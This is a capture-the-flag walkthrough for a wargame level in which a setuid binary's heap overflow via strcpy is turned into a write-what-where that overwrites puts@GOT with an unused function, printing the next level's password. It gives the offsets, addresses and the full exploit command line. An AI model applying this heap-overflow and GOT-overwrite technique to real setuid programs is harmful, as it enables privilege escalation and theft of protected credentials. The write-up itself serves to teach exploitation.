level7 - walkthrough
====================

Target: /home/user/level7/level7   (setuid + setgid level8)
Goal:   read /home/user/level8/.pass

1. Recon (objdump -d level7), main():
     a = malloc(8); a->id = 1; a->buf = malloc(8);
     b = malloc(8); b->id = 2; b->buf = malloc(8);
     strcpy(a->buf, argv[1]);           ; <-- unbounded -> heap overflow
     strcpy(b->buf, argv[2]);           ; writes argv[2] to *b->buf
     fopen("/home/user/level8/.pass","r"); fgets(0x8049960, 0x44, fp);
     puts("~~");
   Unused m() @ 0x080484f4:
     printf("%s - %d\n", 0x8049960, time(NULL));  ; prints the global buffer
   The global 0x8049960 is exactly where fgets() stores the level8 password.

2. The primitive
   The four mallocs are laid out consecutively:  a, a->buf, b, b->buf.
   Overflowing a->buf (argv[1]) runs into struct b and overwrites its `buf`
   pointer. The second strcpy then writes argv[2] to whatever address we put
   there -> a write-what-where.

3. Offset (gdb, break at first strcpy)
     a->buf = 0x0804a018 ,  b = 0x0804a028  ->  &b->buf = b+4 = 0x0804a02c
     0x0804a02c - 0x0804a018 = 0x14 = 20 bytes.

4. Target: overwrite puts@GOT with &m
     $ objdump -R level7 | grep puts     -> 08049928 R_386_JUMP_SLOT puts
     m @ 0x080484f4
   After fgets() has loaded the password into 0x8049960, the program calls
   puts("~~"); if puts@GOT points to m(), m() prints the password.

5. Payload
     argv[1] = "A"*20 + p32(0x08049928)   ; overflow a->buf -> b->buf = puts@GOT
     argv[2] = p32(0x080484f4)            ; strcpy writes &m into puts@GOT

     $ ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') \
                $(python -c 'print "\xf4\x84\x04\x08"')

   Output: the level8 password, followed by " - <unix time>" (from m()'s
   printf format "%s - %d").

